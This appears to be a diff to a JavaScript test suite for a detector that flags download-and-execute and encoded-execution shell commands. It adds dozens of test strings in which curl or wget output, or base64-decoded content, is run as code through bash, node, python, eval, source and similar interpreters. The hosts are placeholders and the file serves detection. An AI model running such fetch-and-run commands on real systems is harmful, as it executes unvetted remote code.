@@ -170,6 +170,57 @@ describe("R2 download and execute", () => {
     expectNotRule("download-execute", ["curl https://example.invalid/i | bash -o pipefail", "curl https://example.invalid/i | node --require ./hook.js"]);
   });
 
+  // Codex P2 (4366198497): a substitution counts only where it supplies the program.
+  it("a download substituted into a named script's arguments is data, not code", () => {
+    expectNotRule("download-execute", [
+      'node scripts/check-response.js "$(curl https://example.invalid/data)"',
+      'python scripts/check_response.py "$(curl https://example.invalid/data)"',
+      'bash scripts/check-response.sh "$(curl https://example.invalid/data)"',
+      'sh ./tool.sh --data "$(wget -qO- https://example.invalid/data)"',
+      "node --max-old-space-size=4096 tool.js `curl https://example.invalid/data`",
+      'perl report.pl "$(curl https://example.invalid/data)"',
+      'powershell -File parse.ps1 "$(curl https://example.invalid/data)"',
+      "sh -c 'node tool.js \"$(curl https://example.invalid/data)\"'",
+    ]);
+  });
+
+  it("option values and file names aren't program text", () => {
+    expectNotRule("download-execute", [
+      'node -r "$(curl https://example.invalid/hook)" app.js', // -r takes a module name
+      'python -m "$(curl https://example.invalid/m)"', // -m takes a module name
+      'bash "$(curl https://example.invalid/path)"', // $(...) where a file name goes names a file
+      'source "$(curl https://example.invalid/path)"',
+      'echo "node -e $(curl https://example.invalid/i)"', // echo prints it
+    ]);
+  });
+
+  it("a download substituted as the program itself is still detected", () => {
+    expectRule("download-execute", [
+      'node -e "$(curl https://example.invalid/i)"',
+      'node --eval "$(curl https://example.invalid/i)"',
+      'node --eval="$(curl https://example.invalid/i)"',
+      'node -p "$(curl https://example.invalid/i)"',
+      'python -c "$(curl https://example.invalid/i)"',
+      'python3 -c "$(wget -qO- https://example.invalid/i)"',
+      'bash -c "$(curl https://example.invalid/i)"',
+      'sh -ec "$(curl https://example.invalid/i)"',
+      'zsh -c "`curl https://example.invalid/i`"',
+      'perl -e "$(curl https://example.invalid/i)"',
+      'ruby -e "$(curl https://example.invalid/i)"',
+      'pwsh -c "$(curl https://example.invalid/i)"',
+      "bash <(curl https://example.invalid/i)",
+      "bash --norc <(curl https://example.invalid/i)",
+      "node <(curl https://example.invalid/i)",
+      "python3 <(curl https://example.invalid/i)",
+      "powershell -File <(curl https://example.invalid/i)",
+      "source <(curl https://example.invalid/i)",
+      ". <(curl https://example.invalid/i)",
+      'eval "$(curl https://example.invalid/i)"',
+      "eval `curl https://example.invalid/i`",
+      "sh -c 'node -e \"$(curl https://example.invalid/i)\"'",
+    ]);
+  });
+
   // Codex P2 #2: wget saves to a file unless told to write to stdout.
   it("wget's default and named output files aren't direct execution", () => {
     expectNotRule("download-execute", [
@@ -245,6 +296,27 @@ describe("R3 encoded or hidden execution", () => {
       "echo SGVsbG8= | base64 -d | sh -c 'cat > out'",
     ]);
     expectRule("encoded-execution", ["echo SGVsbG8= | base64 -d | node -", "echo SGVsbG8= | base64 -d | bash -s", "echo SGVsbG8= | base64 -d | python3 -", "echo SGVsbG8= | base64 -d | pwsh -c -"]);
+  });
+
+  it("decoded content substituted into a named script's arguments is data, not code", () => {
+    expectNotRule("encoded-execution", [
+      'node scripts/check-response.js "$(base64 -d response.b64)"',
+      'python handle.py "$(echo SGVsbG8= | base64 -d)"',
+      'bash ./consume.sh "$(base64 --decode in.b64)"',
+      'node -r "$(base64 -d hook.b64)" app.js',
+      "sh -c 'python3 tool.py \"$(base64 -d p.b64)\"'",
+    ]);
+  });
+
+  it("decoded content substituted as the program itself is detected", () => {
+    expectRule("encoded-execution", [
+      'node -e "$(base64 -d payload.b64)"',
+      'python -c "$(echo SGVsbG8= | base64 -d)"',
+      'perl -e "$(base64 -d p.b64)"',
+      "bash <(base64 -d p.b64)",
+      "source <(echo SGVsbG8= | base64 -d)",
+      "sh -c 'python3 -c \"$(base64 -d p.b64)\"'",
+    ]);
   });
 
   it("lookalikes aren't flagged", () => {
